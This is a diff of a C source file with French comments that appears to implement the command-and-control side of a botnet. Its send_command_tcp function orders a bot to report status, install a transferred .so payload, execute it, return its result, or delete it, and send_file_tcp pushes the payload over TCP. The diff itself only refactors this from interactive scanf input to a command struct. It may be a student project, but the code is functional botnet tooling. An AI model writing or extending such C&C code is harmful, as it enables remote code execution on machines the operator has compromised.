@@ -1,10 +1,22 @@
-#include "protocole.h"
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <errno.h>
+#include <sys/sendfile.h>
+#include <libnetwork.h>
+#include "cc.h"
 
 /**
- * void send_file_tcp(void *s)
+ * void send_file_tcp(void *s, char *filename)
  * Fonction qui envoie la charge de travail dans la socket TCP puis la ferme à la fin 
- * 
+ *
  * param pointeur vers la socket TCP
+ * param le nom de fichier à envoyer
  * 
  */
 void send_file_tcp(void *s, char *filename)
@@ -19,7 +31,6 @@ void send_file_tcp(void *s, char *filename)
     int remain_data;
 
     //Read file
-    //fd = open("example.so", O_RDONLY);
     fd = open(filename, O_RDONLY);
     if (fd == -1)
     {
@@ -67,7 +78,7 @@ void send_file_tcp(void *s, char *filename)
 }
 
 /**
- * void send_commad_tcp(void *s, char num)
+ * void send_command_tcp(void *s, char num)
  * Fonction qui récupère une socket_tcp et un numéro de commande sous forme de char(pour optimiser)
  * selon le numéro de commande elle envoie un ordre sous forme de chaine de caractère au bot
  * selon l'ordre qu'il recevra il agira en conséquence sur la charge utile
@@ -76,15 +87,12 @@ void send_file_tcp(void *s, char *filename)
  * param pointeur vers la socket TCP
  */
 
-void send_commad_tcp(void *s)
+void send_command_tcp(ordre_t *ordre)
 {
-    int socket_tcp = *((int *)s);
-    char num;
-    char filename[TAILLE_FILENAME];
+    int socket_tcp = init_socket_bot(ordre->bot);
+    char num = ordre->cmd;
+    char *filename = ordre->filename;
     char msg_recu[TAILLE_MSG_PROTOCOLE];
-    printf("Donnez un numéro de commande (entre 1 et 5): \n");
-    //TODO : Retirer les scanf
-    scanf("%c", &num);
     switch (num)
     {
     case '1': //Demande d'envoyer le statut du bot
@@ -100,9 +108,6 @@ void send_commad_tcp(void *s)
     case '2': //Demande d'installation puis l'envoie du fichier à envoyer
         printf("Demande d'installation' d'un fichier\n");
         write(socket_tcp, &num, sizeof(char));
-        printf("Quel fichier voulez-vous envoyer:example.so? example1.so ? ou example2.so\n");
-        scanf("%s", filename);
-        //strcpy(filename, tem);
         write(socket_tcp, filename, TAILLE_FILENAME);
         send_file_tcp((void *)&socket_tcp, filename);
         break;
@@ -110,15 +115,11 @@ void send_commad_tcp(void *s)
     case '3': //Demande d'exécuter le fichier
         printf("Demande d'exec d'un fichier\n");
         write(socket_tcp, &num, sizeof(char));
-        printf("Quel fichier voulez-vous executer:example.so? example1.so ? ou example2.so\n");
-        scanf("%s", filename);
         write(socket_tcp, filename, TAILLE_FILENAME);
         break;
     case '4': //Demande de donner le résultat de l'exec
         printf("Demande d'avoir le resultat d'exec d'un fichier\n");
         write(socket_tcp, &num, sizeof(char));
-        printf("Vous souhaitez le résultat d'exec de quel fichier ? : example.so? example1.so ? ou example2.so\n");
-        scanf("%s", filename);
         write(socket_tcp, filename, TAILLE_FILENAME);
         if (receiveTCP(socket_tcp, msg_recu, TAILLE_MSG_PROTOCOLE) < 0)
         {
@@ -130,8 +131,6 @@ void send_commad_tcp(void *s)
     case '5': // Demande de supprimer
         printf("Demande de suppression d'un fichier\n");
         write(socket_tcp, &num, sizeof(char));
-        printf("Quel fichier voulez-vous supprimer :example.so? example1.so ? ou example2.so\n");
-        scanf("%s", filename);
         write(socket_tcp, filename, TAILLE_FILENAME);
         break;
     case '6': //Demande de quitter la connexion
@@ -142,4 +141,5 @@ void send_commad_tcp(void *s)
         printf("Erreur\n");
         exit(-1);
     }
+    close(socket_tcp);
 }
